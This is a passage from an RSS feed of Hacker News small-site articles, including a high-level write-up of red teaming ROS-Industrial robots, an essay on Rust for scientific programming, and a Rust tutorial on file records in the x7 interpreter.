/********* Sample code generated by the curl command line tool **********
 * All curl_easy_setopt() options are documented at:
 * https://curl.haxx.se/libcurl/c/curl_easy_setopt.html
 ************************************************************************/
#include &lt;curl/curl.h&gt;

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd;

</code></pre>

<p>Even Google love Curl, having curl in over 100 devices.<br>
This leads us to Google’s fuzzing project, where they have<br>
an army of computers that feed automated generated data in order<br>
to find bugs.<br>
This has resulted in curl being more stable, secure, and mature.</p>

<p>The world is always moving and so is the technology evolution.<br>
Getting a bit dystopian here, but maybe we will move to a future<br>
where we are running everything in a browser.<br>
A world where everything runs ipv6 and http3.</p>

<p>In that world, I know one tool we can count on.</p>

<h3 id="external-links">External links:</h3>

<p><a href="https://curl.haxx.se/">https://curl.haxx.se/</a><br>
<a href="https://curl.haxx.se/docs/security.html">https://curl.haxx.se/docs/security.html</a><br>
<a href="https://en.wikipedia.org/wiki/CURL">https://en.wikipedia.org/wiki/CURL</a><br>
<a href="https://twitter.com/bagder">https://twitter.com/bagder</a><br>
<a href="https://www.wolfssl.com/">https://www.wolfssl.com/</a><br>
<a href="https://daniel.haxx.se/">https://daniel.haxx.se/</a><br>
<a href="https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl">https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl</a><br>
<a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29">https://en.wikipedia.org/wiki/Gopher_%28protocol%29</a><br>
<a href="https://curl.haxx.se/mail/">https://curl.haxx.se/mail/</a></p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/09/security-headlines-curl-special/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514932</guid>
            <pubDate>Fri, 18 Sep 2020 10:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Red teaming the Robot Operating System in industry]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514906">thread link</a>) | @vmayoral
<br/>
September 18, 2020 | https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/ | <a href="https://web.archive.org/web/*/https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	<div>
		<!--kg-card-begin: markdown--><p>ROS is rapidly becoming a standard in robotics, including its growing use in industry. The commonly held assumption that robots are to be deployed in closed and isolated networks does not hold any further and while developments in ROS 2 show promise, the slow adoption cycles in industry will push widespread ROS 2 industrial adoption years from now. ROS will prevail in the meantime so we wonder, <strong>can ROS be used securely for industrial use cases even though its origins didn't consider it?</strong></p>
<p>This essay summarizes the work my team and I conducted over the last period tackling this question. For more, refer to the following resources:</p>
<ul>
<li><a href="https://aliasrobotics.com/case-study-red-teaming.php"><code>Red teaming ROS-Industrial case study</code></a></li>
<li><a href="https://aliasrobotics.com/files/red_teaming_rosindustrial.pdf"><code>Red teaming ROS-Industrial extended report (white paper)</code></a> (<em>56 pages</em>)</li>
</ul>
<h3 id="isitsecuretouserosinindustry">Is it secure to use ROS in industry?</h3>
<p>The Robot Operating System (ROS) is the de facto framework for robot application development. According to the ROS community metrics that are sampled every year on July, more than 20 million total downloads of ROS packages happened in July 2019. A shocking number given the small size of the robotics community. At the time of writing, the original ROS article has been cited more than 7000 times, which shows its wide acceptance for research and academic purposes. ROS was born in this environment: its primary goal was to provide the software tools that users would need to undertake novel research and development.  First with the PR2 robot while being developed at Willow Garage, and then for the overall robotics community with the creation of the Open Source Robotics Foundation in 2012.</p>
<p>ROS' popularity has continued to grow in industry supported by projects like ROS-Industrial (ROS-I for short)<sup><a href="#fn1" id="fnref1">[1]</a></sup>, an open-source initiative that extends the advanced capabilities of ROS software to industrial relevant hardware and applications. Spearheaded by the ROS-Industrial consortium, its deployment in industry is now a reality. The consortium has more than 80 members and its gatherings in Europe, USA and Asia bring together hundreds of robotics experts every year.</p>
<p>
    <img alt="ros_readteaming_scenario" src="https://cybersecurityrobotics.net/content/images/2020/09/esquema-3-.png">
    </p><figcaption>
        <strong>Use case architecture diagram</strong>. The synthetic scenario presents a network segmented in 5 levels with segregation implemented following recommendations in NIST SP 800-82 and IEC 62443 family of standards. There are 6 identical robots from Universal Robots presenting a variety of networking setups and security measures, each connected to their controller. $\hat{S_n}$ and $\hat{C_n}$ denote security hardened versions of an $n$ control station or controller respectively.
    </figcaption>

<p>With dozens of publicly available speeches on how ROS is being used for automation tasks, open source tools available and system integrators picking ROS for real problems under safety constraints, we argue that it is nowadays a relevant piece of software used for industry. Unfortunately, as it's often common in industry, security is not a priority.</p>
<p>ROS was not designed with security in mind, but as it started being adopted and deployed into products or used in government programs, more attention was placed on it. Some of the early work on securing ROS include <sup><a href="#fn2" id="fnref2">[2]</a></sup>, <sup><a href="#fn3" id="fnref3">[3]</a></sup> or <sup><a href="#fn4" id="fnref4">[4]</a></sup>, all of them appearing in the second half of 2016.  At the time of writing, none of these efforts remain actively maintained and the community focus on security efforts has switched to ROS 2, the next generation of ROS. ROS 2 builds on top of DDS and shows promise. However, to the best of our knowledge, there're still no known robots running ROS 2 in production at scale. From our experience analyzing robots used in industry, their operating systems, libraries and dependencies, we argue that ROS 2 is still years from being widely deployed for major automation tasks. Until then, ROS will prevail.</p>
<h3 id="researchquestion">Research question</h3>
<p>With the advent of ROS in industry and professional use, one question remains:</p>
<blockquote>
<p>Even though ROS was not designed with security in mind, can companies use it securely for industrial use cases?</p>
</blockquote>
<p>The work introduced in here tackles this question experimentally by performing a <mark>targeted security exercise</mark>, namely <strong>red teaming</strong>, to determine whether ROS and more specifically, ROS and ROS-Industrial packages could be used securely in an industrial setup. We construct a synthetic industrial scenario and choose one of the most common industrial robots with ROS-I support to build it. We then apply available security measures to the setup following official recommendations and program a simple flow of operation.</p>
<p>Using this setup, we perform a red teaming exercise with the following two goals:</p>
<ul>
<li><mark>Goal $G_1$</mark>: Control, deny access or disrupt the ROS computational graph.</li>
<li><mark>Goal $G_2$</mark>: Control, deny access or disrupt the operation of robots (ROS-powered or not)<sup><a href="#fn5" id="fnref5">[5]</a></sup>.</li>
</ul>
<p>To achieve these goals, we create four different attacks that target the ROS-Industrial and ROS packages. The results show that ROS Melodic Morenia presents several unpatched security flaws, even when hardened with community recommendations. For details on the attacks, refer to <sup><a href="#fn6" id="fnref6">[6]</a></sup>.</p>
<h3 id="redteaming">Red teaming</h3>
<p>
    <img alt="ros_readteaming_scenario" src="https://cybersecurityrobotics.net/content/images/2020/09/attack-1-1-.png">
    </p><figcaption>
        <strong>Attack targeting ROS-Industrial and ROS core packages</strong>. The attacker exploits a vulnerability present in a ROS package running on $\hat{S_7}$ (actionlib). Since $\hat{S_7}$ is acting as the ROS Master, segregation does not impose restrictions on it and it is thereby used to access other machines in the OT level to send control commands.
    </figcaption>

<p>Red teaming is a full-scope, holistic and targeted (with specific goals) attack simulation designed to measure how well a system can withstand an attack. Opposed to Penetration Testing (<em>pentesting</em> or PT), a red teaming activity does not seek to find as many vulnerabilities as possible to risk-assess them, but has a specific goal. Red teaming looks for vulnerabilities that will maximize damage and meet the selected goals. Its ultimate objective is to test an organization/system detection and response capabilities in production and with respect a given set of objectives. Past works in robot cybersecurity criticize the current status of cybersecurity in robotics and reckon the need of further research. Previous attempts to review the security of robots via offensive exercises or tools mostly focus on proof-of-concept attacks and basic penetration testing, detecting flaws in ROS. A recent study <sup><a href="#fn7" id="fnref7">[7]</a></sup> mentions the identification of several flaws within ROS-Industrial codebase, however it does not explicitly describe  ROS-specific flaws.  Considerations are made with regard the open and insecure architecture predominant in ROS-Industrial deployments throughout its open source drivers. From interactions with the authors of <sup><a href="#fn7" id="fnref7:1">[7:1]</a></sup>, it was confirmed that the reported security issues were made generic on purpose, further highlighting the need for further investment on understanding the security landscape of ROS-Industrial setups.</p>
<p>To the best of our knowledge, no prior public work has performed a red teaming activity on ROS-Industrial packages (or in any other robotics technology for that matter), and challenged its security extensions. The work introduced in here presents a study in which we aim to do so in a realistic industrial scenario.</p>
<h3 id="discussion">Discussion</h3>
<h4 id="findings">Findings</h4>
<table>
<thead>
<tr>
<th>Attack</th>
<th>Description</th>
<th>Goals met</th>
</tr>
</thead>
<tbody>
<tr>
<td>$A_{1.1}$: remove arbitrary code execution</td>
<td>Subject to some prior interactions, attacker with control of $D_1$ is able to exploit a vulnerability in ROS and launch arbitrary remote code executions from a privileged ROS end-point compromising completely the computational graph</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$ and  $R_5$)</td>
</tr>
<tr>
<td>$A_{1.2}$: privilege escalation</td>
<td>Subject to local access, attacker is able to exploit a vulnerability in ROS and escalate privileges (to the ROS ones) in such machine</td>
<td>$G_1$</td>
</tr>
<tr>
<td>$A_{2}$: FIN-ACK flood attack targeting ROS</td>
<td>Attacker attempts to deny ROSTCP connection on target destination by forcing a maxed-out number of connections</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$ and $R_5$)</td>
</tr>
<tr>
<td>$A_3$: PitM attack to a ROS control station &amp; Attacker poisons ARP tables and gains access to the network flow of information siting between targeted publishers and subscribers, interfering with communications as desired.</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$ and $R_5$)</td>
<td></td>
</tr>
<tr>
<td>$A_4$: Insider endpoint via unprotected robot controller</td>
<td>Attackers exploit known vulnerabilities in a robot endpoint to compromise the controller and pivot into the ROS network.</td>
<td>$G_1$ and $G_2$ ($R_1$, $R_2$, $R_3$, $R_4$, $R_5$ and $R_6$)</td>
</tr>
</tbody>
</table>
<p>$G_1$ is achieved in all the presented attacks whereas $G_2$ is mostly achieved yet depends on the hardening of the corresponding control stations and robotic endpoints.<br>
At the time of writing, among the vulnerabilities we exploited most remain active. An exception is <a href="https://github.com/aliasrobotics/RVD/issues/2401">RVD#2401</a> which got resolved by Open Robotics within 30 hours from the moment we submitted a mitigation.</p>
<h4 id="lessonslearned">Lessons learned</h4>
<p>Through our experiments we showed how control stations running Ubuntu 18.04 do not protect ROS or ROS-Industrial deployments. Moreover, the guidelines offered by Canonical <sup><a href="#fn8" id="fnref8">[8]</a></sup> for securing ROS are of little use against targeted attacks, as demonstrated. Certain ongoing hardening efforts for ROS Melodic <sup><a href="#fn9" id="fnref9">[9]</a></sup> helped mitigate some issues but regardless, most goals were still achieved with attacks targeting threats like zero days, wide and availability of industrial components, inadequate security practices or non-patched OS and firmware.</p>
<blockquote>
<p>control stations running Ubuntu 18.04 do not protect ROS or ROS-Industrial deployments. Moreover, the guidelines offered by Canonical <sup><a href="#fn8" id="fnref8:1">[8:1]</a></sup> for securing ROS are of little use against targeted attacks, as demonstrated.</p>
</blockquote>
<p>Dedicated robotic security protection systems like the <a href="https://aliasrobotics.com/ris.php">Robot Immune System (RIS)</a> used in $\hat{C_2}$, $\hat{C_5}$ or $\hat{C_6}$ managed to secure the corresponding robot avoiding directed attacks however $R_2$ and $R_5$ robots were still<em>hijacked</em> by compromising the ROS computational graph via their control stations. RIS was not able to stop these attacks because they came from trusted sources whose behavior was learned over a prior training phase. An …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/">https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/</a></em></p>]]>
            </description>
            <link>https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514906</guid>
            <pubDate>Fri, 18 Sep 2020 10:05:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust in Science and ever-changing requirements]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514890">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements | <a href="https://web.archive.org/web/*/https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-a12f56daf5f5d65fe346"><div><p>I have heard many times over that for a given proof-of-concept if you have fast, changing requirements, then you are better off with a <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">Dynamic programming language</a> like Python. Python gives the illusion of faster development because you do not have to think about the <em>rigidity</em> of the <a href="https://en.wikipedia.org/wiki/Type_system">Type system</a> as much. Hence, it makes these dynamic languages good for prototyping and creating proofs-of-concept.</p><p>However, in this essay, I am trying to dump some thoughts about <a href="https://www.rust-lang.org/">Rust</a> usage in scientific computation, its benefits, and generic chatter in the community. I think using Rust has an advantage in an ever-mutating environment like research and I think even for prototyping, Rust can be much more beneficial than a language like Python.</p><h2>Introduction </h2><p>I am very much in a love affair with Rust. This is not going to come to you as a surprise at all if you <a href="https://twitter.com/amanjeev">follow me on Twitter</a>. Part of the reason is that I work as a software writer and general yak shaver for science-(genomics)-adjacent work and I appreciate what Rust has to offer in terms of the ecosystem, safety, and speed. I'd argue that a lot of work that is usually written in C/C++, Python, Perl, etc. could be replaced by Rust.</p><p>Perhaps I do not need to spend a lot of effort to convince you that Rust can replace some C/C++ codebase more easily because Rust is a <a href="https://en.wikipedia.org/wiki/System_programming_language">Systems programming language</a>. But for proofs-of-concept, you ask, how can Rust be better than, say Python? Isn't it painful to change the code, which you do in early prototyping when you have to use a Static language[1]?</p><h2>The case of Python</h2><p>When I started in the sciences as a programmer, reading Perl was always an issue and the choice that I had to make was clear to me — I chose Python. Perl was slowly being displaced by Python anyway. So, I will give you some anecdotal comparisons from my experiences.</p><p>You might think that I am comparing apples to oranges and you are absolutely correct. This is an opinion blog post! I am choosing Python also because it is touted as the language which makes life easier to work with given ever-changing requirements.</p><h2>Ever-changing requirements</h2><p>One issue that I always hear is the idea of “refactoring” and/or “changing course”. Computation in sciences, they say, is a lot of trial and error. I find this to be true! I have worked in novel projects where even the stakeholders (scientists) were learning while we were building the projects. There is a lot of backtracking and honestly a lot of your "software engineering" breaks down.</p><p>For this article, I am going to focus on some attributes of languages that instill confidence in making the changes so that you can iterate. I believe the following attributes are necessary to work with constantly changing requirements —</p><ol data-rte-list="default"><li><p>Readability</p></li><li><p>Testability</p></li><li><p>Feedback</p></li><li><p>Toolchain</p></li></ol><h3>Readability</h3><h4>Syntax</h4><p>The clear advantage of Python is its syntactic readability if you are considerate of that while writing (but it does not always pan out!). This means that it is easier to keep the code in your head to make the model, while you are making changes. Rust can be hard to read because it does not fit the imperative, object-oriented style mental model we have with languages like Python. Rust’s ownership model and typing definitely have some learning curve.</p><p>I have taught Git and Python to my colleagues and in many ways, they — and I — have had to build new mental models for these tools as well, especially if they are already familiar with C++, Perl, and SVN, CVS. Learning new mental models is what we do all the time. Still, I agree that this requires a lot of effort on the programmer’s part. This is especially true for an experienced programmer.</p><p>As <a href="https://twitter.com/ekuber">Esteban</a> says in his <a href="https://youtu.be/Z6X7Ada0ugE">RustConf 2020 talk — Bending the Curve: A Personal Tutor at Your Fingertips</a> — </p><blockquote><p><em>Rust has a curse, it has many but this one is critical — inefficient code is generally visible. Experienced developers hate to notice that their code is inefficient.</em></p></blockquote><h4>Jumping around the codebase</h4><p>Rust is statically typed, empowers your editor or <a href="https://en.wikipedia.org/wiki/Integrated_development_environment">Integrated Development Environment (IDE)</a> to link the symbols in your code for easy access. A function defined somewhere in a <code>struct</code> can be easily found from where it is called. This makes looking up code for dependencies much easier and faster.</p><p>The only tool in Python that brings us any closer to this style of working is <a href="https://www.jetbrains.com/pycharm/">JetBrains PyCharm</a>. And even this IDE for Python fails to look up <em>symbols</em> if you mess up your <code><a href="https://docs.python.org/3/tutorial/venv.html">virtualenv</a></code> or fail to register it with your PyCharm project. You can use <code><a href="https://docs.python.org/3/library/typing.html">typing</a></code> to annotate your code with the types but as you can see that there is a warning at the top of <a href="https://docs.python.org/3/library/typing.html">the </a><code><a href="https://docs.python.org/3/library/typing.html">typing</a></code><a href="https://docs.python.org/3/library/typing.html"> documentation</a> -</p><blockquote><p><em>Note: The Python runtime does not enforce function and variable type annotations. They can be used by third-party tools such as type checkers, IDEs, linters, etc.</em></p></blockquote><p>With Rust, you can survive with just the compiler because these types are a part of the language. Add <a href="https://github.com/rust-lang/rls">Rust Langauge Server (RLS)</a> to that and you can comfortably navigate your codebase.</p><h4>Docs!</h4><p>Since Rust is statically typed, you can see what is the expected type of each function argument or what is the type of the value that the function returns. Its type system becomes part of the documentation! Whereas in Python you have to use external tools and depend on function annotations to generate documentation, <a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html">Rust brings the documentation to you via </a><code><a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html">rustdoc</a></code>.</p><p>For example, please compare —</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_5505"><div><p>It is a tiny example and while Rust's syntax is denser, it also provides clarity on what the elements stand for. Here, <code><strong>ChillinNum</strong></code> is the type of the return value. We could have just used <code><strong>u32</strong></code> but using <code><strong>ChillinNum</strong></code> is clearer. If you run <code>cargo doc</code> in your codebase, Rust compiler will take all these triple-slash <code><strong>///</strong></code> comments and generate nice documentation for you. You can see the <a href="https://docs.rs/eyre/0.6.0/eyre/">documentation of the crate </a><code><a href="https://docs.rs/eyre/0.6.0/eyre/"><strong>eyre</strong></a></code> and the <a href="https://github.com/yaahc/eyre/blob/master/src/lib.rs">source of the crate </a><code><a href="https://github.com/yaahc/eyre/blob/master/src/lib.rs"><strong>eyre</strong></a></code><a href="https://github.com/yaahc/eyre/blob/master/src/lib.rs"> that generates it</a>.</p><h3>Testability</h3><p>Python has a ton of testing frameworks and Rust is slowly catching up. A clear advantage in favor of Python. However, the things you are testing also dictate how much confidence you have in your codebase. With the type system in Rust, you do not have to test for certain cases that in Python you’d have to. This means there are certain test cases that you do not need to write if you’re building your project in Rust. To me, this makes the iteration faster with more confidence in the code I am writing.</p><p>As <a href="https://twitter.com/ekuber">Esteban</a> puts it —</p><blockquote><p><em>The reduced need for tests is because of using patterns that leverage the type system to completely eliminate the representability of an invalid state.</em></p></blockquote><p>Take Rust's <code>match</code> pattern, as an example. The following code will fail to compile because we failed to provide a catch-all —</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_6952"><p>Previously, we had provided the default/catch-all case<strong> </strong><code><strong>_ =&gt; return 0,</strong></code>. Similarly, the Rust compiler will complain if you are not covering all the variants of a Rust <code><strong>enum</strong></code> in your <code><strong>match</strong></code> pattern. This helps the programmer in considering all the paths and cases. The compiler will show an error like this —</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_8590"><div><p>I do not enjoy writing tests and eating my veggies but if I could eat fewer veggies to achieve the same level of confidence in my changes, I’d always choose that.</p><p>This also brings me to the point of designing your project. Just because your project is in alpha/beta/whateva, does not mean that you are not allowed to think about your data structures, your types before the implementation. A little bit of thought in the structure of your codebase goes a long way, especially when you have to change it. Once again, listen to <a href="https://twitter.com/ekuber">Esteban</a> —</p><blockquote><p><em>Thinking about the API surface first and then changing the internal logic and in-memory representation to make it faster/more efficient is much easier in type-safe languages than in dynamic languages, and more so in Rust simply because more things are represented in the type system than is customary in other languages. This makes "iteratively fixing the compiler errors" a valid refactoring strategy.</em></p></blockquote><p>These points, to me, sound like Rust has more advantages than Python if we count Testing as a property of confidence in the changes we are making.</p><h3>Feedback </h3><p>Even though Rust has its <em>new</em> paradigm issues[2] when it comes to learning the language, I still feel that Rust compiler emits some of the most helpful error messages and help messages. The safety features are built right into the compiler and the team has done a fantastic job so far in making messages ergonomic. For example, in Rust, the array out of bounds error looks like this —</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_10179"><p>For Python, this looks like this —</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_11540"><p>We've already seen an error message above for missing catch-all but let me show that again —</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_12616"><div><p>Side note: It is amazing that languages can and do learn from each other and copy parts that seem helpful for the users. One recent exciting case is <a href="https://devblogs.microsoft.com/cppblog/new-safety-rules-in-c-core-check/">New safety rules in C++ Core Check</a>. I am very happy to have other languages learn, as Rust has from what came before.</p><p>I hope you can appreciate the effort being put into the compiler and its error messages. Once again, <a href="https://twitter.com/ekuber">Esteban</a>’s talk is a fantastic watch, where he talks about the Rust compiler as a tutor.</p><blockquote><p><em>When we are emitting diagnostic errors, it is the perfect place and moment to teach people [that] they have made a mistake and we can explain to them why they made it.</em></p></blockquote><p>I will embed the talk here for you —</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1599922045084_16054"><div><p>Python, on the other hand, had me stuck for a whole day because it complained somewhere I was scripting <code><strong>NoneType</strong></code>. If you care, this is the pet peeve that started this blog post.</p><h3>Toolchain</h3><p>In the Python world, the packaging and environment setup is still something that makes me sad. The closest I have come to create some sanity in my life is to use <code><strong>direnv</strong></code> and <code><strong>shell</strong>.<strong>nix</strong></code> in my repositories. This sucks because this is a solution that is at the OS (NixOS) level[3]. Indeed there are tools available for auto-loading environments, and I am thankful for that. However, Python toolset feels like a moving target. Years ago, it was just <code><strong>setup</strong>.<strong>py</strong></code> and today it is <code><strong>setup</strong>.<strong>cfg</strong></code>, <code><strong>pyproject</strong>.<strong>toml</strong></code> as well but the latter two do not support all the features so you end up having <code><strong>setup</strong>.<strong>py</strong></code> in your codebase. Here, <a href="https://snarky.ca/what-the-heck-is-pyproject-toml/">let Tall, Snarky Canadian explain it to you</a>. </p><p>On …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements">https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements</a></em></p>]]>
            </description>
            <link>https://amanjeev.com/blog/rust-in-science-and-ever-changing-requirements</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514890</guid>
            <pubDate>Fri, 18 Sep 2020 10:01:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Oxidizing Portals with Zbus]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514707">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://belmoussaoui.com/article/13-oxidizing-portals | <a href="https://web.archive.org/web/*/https://belmoussaoui.com/article/13-oxidizing-portals">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://belmoussaoui.com/article/13-oxidizing-portals</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514707</guid>
            <pubDate>Fri, 18 Sep 2020 09:27:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Records in X7]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514658">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7 | <a href="https://web.archive.org/web/*/https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org2fd690a">
<p>
The original motivation for adding <code>Record</code> to <code>x7</code> is the ability to open, read, and write to files.
We'll back the <code>x7</code> File implementation by the <code>rust</code> File struct, so let's make a new file in <code>x7</code> - <code>records/file.rs</code>:
</p>
<p>
We will start by making a <code>FileRecord</code> struct:
</p>
<div>
<pre><span>#</span><span>[</span><span>derive</span><span>(</span><span>Clone, Debug</span><span>)</span><span>]</span>
<span>pub</span><span>(</span><span>crate</span><span>)</span> <span>struct</span> <span>FileRecord</span> <span>{</span>
    <span>path</span>: <span>String</span>,
    <span>// </span><span>The Record trait requires Sync + Send</span>
    <span>file</span>: <span>Arc</span><span>&lt;</span><span>Mutex</span><span>&lt;</span><span>std</span>::<span>fs</span>::<span>File</span><span>&gt;</span><span>&gt;</span>,
<span>}</span>
</pre>
</div>
<p>
The type <code>Arc&lt;Mutex&lt;std::fs::File&gt;&gt;</code> is necessary as <code>x7</code> requires all types to be thread safe.
</p>
<p>
Now that we have a struct, let's expose a way to generate one from <code>x7</code>. We want the following <code>x7</code> expression to work:
</p>

<p>
This will map to a <code>Expr::String("file-name")</code> in the interpreter, so we need two methods:
</p>
<ol>
<li>A way to open files given a <code>String</code></li>
<li>A way to open files given an <code>Expr::String</code></li>
</ol>
<p>
With that in mind, here's the two relevant methods:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
      <span>/// Open a file with the given Path</span>
      <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>open_file</span><span>(</span><span>path</span>: <span>String</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>Open the file with liberal permissions.</span>
      <span>let</span> <span>f</span> = <span>OpenOptions</span>::new<span>()</span>
          .write<span>(</span><span>true</span><span>)</span>
          .create<span>(</span><span>true</span><span>)</span>
          .read<span>(</span><span>true</span><span>)</span>
          .open<span>(</span>path.clone<span>()</span><span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not open file \"{}\" because {}"</span>, &amp;path, e<span>)</span><span>)</span><span>?</span>;
      <span>// </span><span>Make the path pretty.</span>
      <span>let</span> <span>abs_path</span> = <span>fs</span>::canonicalize<span>(</span>path<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not canonicalize path! {}"</span>, e<span>)</span><span>)</span><span>?</span>
          .to_str<span>()</span>
          .ok_or_else<span>(</span>|| <span>anyhow!</span><span>(</span><span>"Could not represent path as UTF-8 string"</span><span>)</span><span>)</span><span>?</span>
          .into<span>()</span>;
      <span>// </span><span>record! is a macro to assist in making LispResult&lt;Expr::Record&gt; types</span>
      <span>record!</span><span>(</span><span>FileRecord</span>::new<span>(</span>f, abs_path<span>)</span><span>)</span>
  <span>}</span>

  <span>/// Open a file from x7</span>
  <span>/// This function signature will let us expose it directly to the interpreter</span>
  <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>from_x7</span><span>(</span><span>exprs</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span>, <span>_symbol_table</span>: &amp;<span>SymbolTable</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>exact_len!</span><span>(</span>exprs, <span>1</span><span>)</span>;
      <span>let</span> <span>path</span> = exprs<span>[</span><span>0</span><span>]</span>.get_string<span>()</span><span>?</span>;
      <span>FileRecord</span>::open_file<span>(</span>path<span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
Now that we have the ability to make a <code>FileRecord</code>, we'll need to implement <code>Record</code>
so it can be understood by the interpreter (<code>Expr::Record</code>).
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We have no methods yet.</span>
      <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>
    <span>}</span>

    <span>fn</span> <span>type_name</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; &amp;'<span>static</span> <span>str</span> <span>{</span>
        <span>"FileRecord"</span>
    <span>}</span>

    <span>fn</span> <span>display</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>format!</span><span>(</span><span>"File&lt;</span><span>{}</span><span>&gt;"</span>, <span>self</span>.path<span>)</span>
    <span>}</span>

    <span>fn</span> <span>debug</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>self</span>.display<span>()</span>
    <span>}</span>

    <span>fn</span> <span>clone</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>RecordType</span> <span>{</span>
        <span>Box</span>::new<span>(</span><span>Clone</span>::clone<span>(</span><span>self</span><span>)</span><span>)</span>
    <span>}</span>

    <span>fn</span> <span>methods</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>Vec</span><span>&lt;</span>&amp;'<span>static</span> <span>str</span><span>&gt;</span> <span>{</span>
        <span>Vec</span>::new<span>()</span>
    <span>}</span>

    <span>fn</span> <span>id</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>u64</span> <span>{</span>
        <span>use</span> <span>std</span>::<span>collections</span>::<span>hash_map</span>::<span>DefaultHasher</span>;
        <span>use</span> <span>std</span>::<span>hash</span>::<span>{</span><span>Hash</span>, <span>Hasher</span><span>}</span>;
        <span>let</span> <span>mut</span> <span>h</span> = <span>DefaultHasher</span>::new<span>()</span>;
        <span>self</span>.path.hash<span>(</span>&amp;<span>mut</span> h<span>)</span>;
        h.finish<span>()</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We also need to expose <code>FileRecord::from_x7</code> to the interpreter, so let's head back and add it to <code>make_stdlib_fns</code>:
</p>
<div>
<pre> <span>make_stdlib_fns!</span><span>{</span>
  <span>// </span><span>elided functions...</span>
  <span>(</span><span>"call_method"</span>, <span>2</span>, call_method, <span>true</span>, <span>"&lt;doc-string&gt;"</span><span>)</span>,
  <span>// </span><span>Open a file</span>
  <span>(</span><span>"fs::open"</span>, <span>1</span>, <span>FileRecord</span>::from_x7, <span>true</span>, <span>"Open a file."</span><span>)</span>,
